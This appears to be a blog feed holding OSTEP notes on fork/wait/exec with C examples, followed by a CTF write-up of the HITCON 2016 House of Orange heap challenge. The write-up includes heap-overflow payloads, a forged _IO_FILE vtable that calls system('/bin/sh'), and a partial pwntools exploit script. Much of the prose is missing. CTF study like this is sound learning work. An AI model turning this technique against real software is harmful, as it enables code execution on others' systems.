        <content type="html"><![CDATA[<h2 id="A-Little-Bit-Process-API"><a href="#A-Little-Bit-Process-API" class="headerlink" title="A Little Bit Process API"></a>A Little Bit Process API</h2><h3 id="fork"><a href="#fork" class="headerlink" title="fork()"></a>fork()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> x=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world (pid:%d)\n&quot;</span>, (<span class="type">int</span>)getpid());</span><br><span class="line">    <span class="type">int</span> rc = fork();</span><br><span class="line">    <span class="keyword">if</span> (rc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// fork failed; exit</span></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// child (new process)</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello, I am child (pid:%d) by (ppid:%d)---%p\n&quot;</span>, (<span class="type">int</span>) getpid(),(<span class="type">int</span>)getppid(),&amp;x);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// parent goes down this path (original process)</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello, I am parent of %d (pid:%d)---%p\n&quot;</span>,</span><br><span class="line">           rc, (<span class="type">int</span>) getpid(),&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; ./p1</span><br><span class="line">hello <span class="title function_">world</span> <span class="params">(pid:<span class="number">5116</span>)</span></span><br><span class="line">hello, I am parent of 5117 <span class="params">(pid:<span class="number">5116</span>)</span>---0x7ffd842ab520</span><br><span class="line">hello, I am <span class="title function_">child</span> <span class="params">(pid:<span class="number">5117</span>)</span> <span class="title function_">by</span> <span class="params">(ppid:<span class="number">1</span>)</span>---0x7ffd842ab520</span><br><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; ./p1</span><br><span class="line">hello <span class="title function_">world</span> <span class="params">(pid:<span class="number">5164</span>)</span></span><br><span class="line">hello, I am parent of 5165 <span class="params">(pid:<span class="number">5164</span>)</span>---0x7ffd2fc1d450</span><br><span class="line">hello, I am <span class="title function_">child</span> <span class="params">(pid:<span class="number">5165</span>)</span> <span class="title function_">by</span> <span class="params">(ppid:<span class="number">5164</span>)</span>---0x7ffd2fc1d450</span><br></pre></td></tr></table></figure><p>man 2 fork</p><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure><p>fork()fork() main() fork()</p><p>forkPID</p><p>forkpid</p><p>fork(copy-on-write )copy on write</p><img src="/2023/04/11/OSTEP-5-Process-API/image-20230411222658013.png" alt="image-20230411222658013" style="zoom:67%;"><p>RETURN VALUE<br>    On success, the PID of the child process is returned in the parent, and<br>    0  is returned in the child.  On failure, -1 is returned in the parent,<br>    no child process is created, and errno is set appropriately.</p><p></p><p>ppidCPUschedulerIO</p><p><img src="/2023/04/11/OSTEP-5-Process-API/image-20230411223805891.png" alt="image-20230411223805891"></p><p>1init,,ID1initPID</p></blockquote><h3 id="wait"><a href="#wait" class="headerlink" title="wait"></a>wait</h3><p>man 2 wait</p><p>,,(reaped)init</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">waitpid</span><span class="params">(<span class="type">pid_t</span> pid,<span class="type">int</span> *stateusp,<span class="type">int</span> options=<span class="number">0</span>)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">waitpid()waitpid()waitpid()</span></span><br><span class="line"><span class="comment"> PID,  option WNOHANG,  0,  1,</span></span><br><span class="line"><span class="comment">arg1    pid&gt;0  id=pid</span></span><br><span class="line"><span class="comment">        pid =0 </span></span><br><span class="line"><span class="comment">        pid=-1 </span></span><br><span class="line"><span class="comment">        pid&lt; -1pid</span></span><br><span class="line"><span class="comment">arg2    wait.h</span></span><br><span class="line"><span class="comment">arg3     WNOHANG:  0)waitpidPID</span></span><br><span class="line"><span class="comment">         WUNTRACED:  PID  PID  </span></span><br><span class="line"><span class="comment">         WCONTINUED:  SIGCONT  </span></span><br><span class="line"><span class="comment">*/</span>    </span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">wait</span><span class="params">(<span class="type">int</span> *statusp)</span>;</span><br><span class="line">waitpid waitpid(- <span class="number">1</span>,*statusp, <span class="number">0</span>)</span><br><span class="line"> PID,  <span class="number">-1</span> </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world (pid:%d)\n&quot;</span>, (<span class="type">int</span>) getpid());</span><br><span class="line">    <span class="type">int</span> rc = fork();</span><br><span class="line">    <span class="keyword">if</span> (rc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// fork failed; exit</span></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// child (new process)</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello, I am child (pid:%d)\n&quot;</span>, (<span class="type">int</span>) getpid());</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// parent goes down this path (original process)</span></span><br><span class="line">        <span class="type">int</span> wc = wait(<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello, I am parent of %d (wc:%d) (pid:%d)\n&quot;</span>,</span><br><span class="line">           rc, wc, (<span class="type">int</span>) getpid());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; ./p2</span><br><span class="line">hello world (pid:5404)</span><br><span class="line">hello, I am child (pid:5405)</span><br><span class="line">hello, I am parent of 5405 (wc:5405) (pid:5404)</span><br></pre></td></tr></table></figure><p>cpu</p><h3 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h3><p>man 3 exec</p><p>exec </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **environ;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">execl</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">const</span> <span class="type">char</span> *arg, ...</span></span><br><span class="line"><span class="params">          <span class="comment">/* (char  *) NULL */</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">execlp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">const</span> <span class="type">char</span> *arg, ...</span></span><br><span class="line"><span class="params">           <span class="comment">/* (char  *) NULL */</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">execle</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">const</span> <span class="type">char</span> *arg, ...</span></span><br><span class="line"><span class="params">           <span class="comment">/*, (char *) NULL, char *const envp[] */</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">execv</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">char</span> *<span class="type">const</span> argv[])</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">char</span> *<span class="type">const</span> argv[], <span class="type">char</span> *<span class="type">const</span> envp[])</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">execvp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">char</span> *<span class="type">const</span> argv[])</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">execvpe</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">char</span> *<span class="type">const</span> argv[],</span></span><br><span class="line"><span class="params">            <span class="type">char</span> *<span class="type">const</span> envp[])</span>;</span><br></pre></td></tr></table></figure><p>execveELF<br></p><p>execvecpu </p><p></p><ul><li></li><li></li><li> ID</li><li></li><li></li></ul><p></p><p><code>int execve(const char *pathname, char *const argv[], char *const envp[])</code></p><ul><li>filename</li><li>argv </li><li>envp</li><li>argv envpnull</li></ul><p><code>int main (int argc, char *argv [], char *envp [])</code></p><p><img src="/2023/04/11/OSTEP-5-Process-API/image-20230420112311806.png" alt="image-20230420112311806"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* myecho.c */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[],<span class="type">char</span> *envp[])</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; argc; j++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;argv[%d]: %s\n&quot;</span>, j, argv[j]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; envp[i]; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, envp[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* execve.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">    <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *newargv[] = &#123; <span class="literal">NULL</span>, <span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">    <span class="type">char</span> *newenviron[] = &#123; <span class="string">&quot;grxer=666&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Usage: %s &lt;file-to-exec&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    newargv[<span class="number">0</span>] = argv[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    execve(argv[<span class="number">1</span>], newargv, newenviron);</span><br><span class="line">    perror(<span class="string">&quot;execve&quot;</span>);   <span class="comment">/* execve() returns only on error */</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/test&gt; gcc  -g -o myecho myecho.c &amp;&amp; gcc -g -o execve execve.c</span><br><span class="line">grxer@grxer ~/D/s/test&gt; ./execve ./myecho</span><br><span class="line">argv[0]: ./myecho</span><br><span class="line">argv[1]: hello</span><br><span class="line">argv[2]: world</span><br><span class="line">grxer=666</span><br><span class="line">./myecho</span><br><span class="line">hello</span><br><span class="line">world</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>forkexevapishell fork  exec cool</p><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> rc = fork();</span><br><span class="line">    <span class="keyword">if</span> (rc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// fork failed; exit</span></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// child: redirect standard output to a file</span></span><br><span class="line">    close(STDOUT_FILENO); </span><br><span class="line">    open(<span class="string">&quot;./p4.output&quot;</span>, O_CREAT|O_WRONLY|O_TRUNC, S_IRWXU);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// now exec &quot;wc&quot;...</span></span><br><span class="line">        <span class="type">char</span> *myargs[<span class="number">3</span>];</span><br><span class="line">        myargs[<span class="number">0</span>] = strdup(<span class="string">&quot;wc&quot;</span>);   <span class="comment">// program: &quot;wc&quot; (word count)</span></span><br><span class="line">        myargs[<span class="number">1</span>] = strdup(<span class="string">&quot;p4.c&quot;</span>); <span class="comment">// argument: file to count</span></span><br><span class="line">        myargs[<span class="number">2</span>] = <span class="literal">NULL</span>;           <span class="comment">// marks end of array</span></span><br><span class="line">        execvp(myargs[<span class="number">0</span>], myargs);  <span class="comment">// runs word count</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// parent goes down this path (original process)</span></span><br><span class="line">        <span class="type">int</span> wc = wait(<span class="literal">NULL</span>);</span><br><span class="line">    assert(wc &gt;= <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; ./p4</span><br><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; cat ./p4.output </span><br><span class="line"> <span class="number">34</span> <span class="number">114</span> <span class="number">918</span> p4.c</span><br></pre></td></tr></table></figure><p></p><p></p><p>fork01  2 </p><p>exec.&#x2F;p4.outputUNIX  0 </p><p>strace -ff filename ()filename.PID</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; strace -ff -o task ./p4</span><br><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; ls ./task*</span><br><span class="line">./task.7615  ./task.7616</span><br><span class="line"></span><br><span class="line">close(1)                                = 0</span><br><span class="line">openat(AT_FDCWD, &quot;./p4.output&quot;, O_WRONLY|O_CREAT|O_TRUNC, 0700) = 1</span><br><span class="line">newfstatat(1, &quot;&quot;, &#123;st_mode=S_IFREG|0777, st_size=17, ...&#125;, AT_EMPTY_PATH) = 0</span><br><span class="line">write(1, &quot; 34 114 918 p4.c\n&quot;, 17)      = 17</span><br></pre></td></tr></table></figure><p>The openat() system call operates in exactly the same way as open(2)</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> OSTEP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2016 Hitcon House Of Orange</title>
      <link href="/2023/04/10/2016-hitcon-house-of-orange/"/>
      <url>/2023/04/10/2016-hitcon-house-of-orange/</url>
      
        <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/s/1f6IBfouAMu1PFnck0vJ41Q">https://pan.baidu.com/s/1f6IBfouAMu1PFnck0vJ41Q</a><br>rg6j</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; checksec houseoforange_hitcon_2016 </span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/Share/ctfwiki/pwn/io_file/houseoforange_hitcon_2016&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>Upgradeorangefree</p><h2 id="libcheap"><a href="#libcheap" class="headerlink" title="libcheap"></a>libcheap</h2><p><code>add(0x10,b&quot;a&quot;) payload=b&#39;a&#39;*0x10+p64(0)+p64(0x21)+p64(0x1f00000001)+p64(0)*2+p64(0xfa1) edit(len(payload),payload)</code></p><p>topchunk</p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410091710000.png" alt="image-20230410091710000"></p><p><code>add(0x1000,b&#39;a&#39;)</code></p><p>chunktopchunkunsortedbin0x10chunk6080,0x8chunk80a0</p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410092959397.png" alt="image-20230410092959397"></p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410092846998.png" alt="image-20230410092846998"></p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410091908716.png" alt="image-20230410091908716"></p><p>main_raena+88House of orange</p><p>unsortedbinunsorted binchunkchunklast remainder chunklargebinchunklargedbinfd_nextsizebk_nextsizelargebinchunkfd_nextsizebk_nextsize</p><p><code>add(0x400,b&#39;c&#39;)</code></p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410132956019.png" alt="image-20230410132956019"></p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410122608560.png" alt="image-20230410122608560"></p><p><code>show()</code>libc</p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410122710779.png" alt="image-20230410122710779"></p><p><code>edit(0x10,b&#39;a&#39;*11+b&#39;grxer&#39;)</code>16heap</p><h3 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">fake_file=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x60</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(_IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">fake_file=fake_file.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># fake_file+=b&#x27;grxer666&#x27;</span></span><br><span class="line">fake_file+=p64(heap+<span class="number">0x508</span>+<span class="number">8</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(system)</span><br><span class="line">payload+=fake_file</span><br></pre></td></tr></table></figure><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410125530529.png" alt="image-20230410125530529"></p><p></p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410132008871.png" alt="image-20230410132008871"></p><p> IO_FILE_plus mode0(&lt;&#x3D;)ljust0xd8vtable</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_file+=p64(heap+<span class="number">0x508</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)*<span class="number">0</span>+p64(system)</span><br></pre></td></tr></table></figure><p>_vtablejumppayload</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p *(struct _IO_FILE_plus*)0x5555557584f0</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = &#123;</span></span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 1852400175, </span><br><span class="line">    _IO_read_ptr = 0x60 &lt;error: Cannot access memory at address 0x60&gt;, </span><br><span class="line">    _IO_read_end = 0x0, </span><br><span class="line">    _IO_read_base = 0x7ffff7dd2510 &quot;&quot;, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x1 &lt;error: Cannot access memory at address 0x1&gt;, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x0, </span><br><span class="line">    _offset = 0, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = 0, </span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x5555557585d0</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p *(struct _IO_jump_t*)0x5555557585d0</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = &#123;</span></span><br><span class="line">  __dummy = 0, </span><br><span class="line">  __dummy2 = 0, </span><br><span class="line">  __finish = 0x0, </span><br><span class="line">  __overflow = 0x7ffff7a523a0 &lt;__libc_system&gt;, </span><br><span class="line">  __underflow = 0x0, </span><br><span class="line">  __uflow = 0x0, </span><br><span class="line">  __pbackfail = 0x0, </span><br><span class="line">  __xsputn = 0x0, </span><br><span class="line">  __xsgetn = 0x0, </span><br><span class="line">  __seekoff = 0x0, </span><br><span class="line">  __seekpos = 0x0, </span><br><span class="line">  __setbuf = 0x0, </span><br><span class="line">  __sync = 0x0, </span><br><span class="line">  __doallocate = 0x0, </span><br><span class="line">  __read = 0x0, </span><br><span class="line">  __write = 0x0, </span><br><span class="line">  __seek = 0x0, </span><br><span class="line">  __close = 0x0, </span><br><span class="line">  __stat = 0x0, </span><br><span class="line">  __showmanyc = 0x0, </span><br><span class="line">  __imbue = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__overflow</p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410132625782.png" alt="image-20230410132625782"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./houseoforange_hitcon_2016&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">libc= ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&quot;26057&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name,price=<span class="number">1</span>,color=<span class="number">1</span></span>):</span><br><span class="line">    ru(<span class="string">b&quot;Your choice : &quot;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&quot;Length of name :&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    ru(<span class="string">b&quot;Name :&quot;</span>)</span><br><span class="line">    s(name)</span><br><span class="line">    ru(<span class="string">b&quot;Price of Orange:&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(price).encode())</span><br><span class="line">    ru(<span class="string">b&quot;Color of Orange:&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(color).encode())</span><br><span class="line"></span><br><span class="line"><span 